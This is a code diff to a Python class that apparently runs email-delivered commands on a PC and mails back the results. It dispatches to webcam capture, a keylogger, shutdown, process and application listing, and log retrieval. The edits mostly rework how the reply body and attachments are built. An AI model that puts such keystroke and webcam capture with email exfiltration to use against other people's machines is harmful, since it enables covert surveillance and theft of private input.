@@ -63,7 +63,8 @@ class Mail:
             self.email_message.attach(picture_attachment)
 
     def webcam(self, lst: list = []):
-        tmp_path, self.body = capture_webcam(lst)
+        tmp_path, tmp_mes = capture_webcam(lst)
+        self.body += tmp_mes
         self.attachment.append(tmp_path)
         # self.email_message.attach(MIMEText(self.body, "plain"))
 
@@ -74,12 +75,7 @@ class Mail:
             self.email_message.attach(picture_attachment)
 
     def keylogger(self, lst: list = []):
-        tmp_path, duration = key_logger(lst)
-        self.attachment.append(tmp_path)
-
-        self.body += (
-            "The program records your keystrokes for " + str(duration) + " seconds.\n"
-        )
+        self.attachment.append(key_logger(lst))
 
         self.email_message.attach(MIMEText(self.body, "plain"))
 
@@ -101,7 +97,7 @@ class Mail:
     def shutdown(self, lst: list = []):
         time = lst[1] if len(lst) > 1 else 10
 
-        self.body = "Shutting down your PC in " + str(time) + " seconds.\n"
+        self.body += "Shutting down your PC in " + str(time) + " seconds.\n"
         self.email_message.attach(MIMEText(self.body, "plain"))
 
         self.send_mail()  #! only shutdown process has the send_mail inside
@@ -111,7 +107,6 @@ class Mail:
     def list_app(self, lst: list = []):
         self.attachment.append(list_running_application())
 
-        self.body += "List of running applications.\n"
         self.email_message.attach(MIMEText(self.body, "plain"))
 
         with open(self.attachment[-1], "r") as text_file:
@@ -124,7 +119,6 @@ class Mail:
     def list_process(self, lst: list = []):
         self.attachment.append(list_running_process())
 
-        self.body += "The list of running processes of your PC attached.\n"
         self.email_message.attach(MIMEText(self.body, "plain"))
 
         with open(self.attachment[-1], "r") as text_file:
@@ -143,8 +137,8 @@ class Mail:
 
     def send_log(self, lst=[]):
         file_path = "Files\\mail.log"
+        self.attachment.append(file_path)
 
-        self.body += "The log file is attached below.\n"
         self.email_message.attach(MIMEText(self.body, "plain"))
 
         with open(file_path, "r") as text_file:
@@ -155,13 +149,11 @@ class Mail:
             self.email_message.attach(text_attachment)
 
     def help(self, lst: list = []):
-        file_path = "Files\\help.txt"
-        writeHelp(file_path)
-
-        self.body += "The list of commands is attached below.\n"
-        self.email_message.attach(MIMEText(self.body, "plain"))
+        writeHelp(file_path := "Files\\help.txt")
 
         self.attachment.append(file_path)
+        self.email_message.attach(MIMEText(self.body, "plain"))
+
         with open(file_path, "r") as text_file:
             text_attachment = MIMEText(text_file.read())
             text_attachment.add_header(
@@ -193,16 +185,19 @@ class Mail:
             self.cmd_list.remove(["shutdown"])
             self.cmd_list.append(["shutdown"])
 
+        check: bool = False
         for comd in self.cmd_list:
             if comd[0] in command:
                 try:
                     command[comd[0]][0](comd)
                 except Exception:
                     self.body += f"ERROR: Cannot {command[comd[0]][1]}\n"
-
-        if not self.body:
-            self.body = "ERROR: Invalid command.\n"
-            self.help()
+            else:
+                check = True
+        
+        if check:
+            self.body += "ERROR: Invalid command. Review the help.txt file for more information.\n"
+            self.help()         
 
     def write_log(self):
         note2log(self.sender, self.cmd_list, self.attachment, self.body)
@@ -230,9 +225,12 @@ class Mail:
             self.write_log()
 
             print(self.body, self.attachment)
-            command = " ".join(self.cmd_list)
+            
+            for i in range(len(self.command)):
+                self.command[i] = " ".join(self.command[i])
+            
             app.add_new_mail(
-                self.sender, command, current_time(), self.body, self.attachment
+                self.sender, self.command, current_time(), self.body, self.attachment
             )
             # Thread(target=self.send_mail_async, args=(app, command)).start()
 
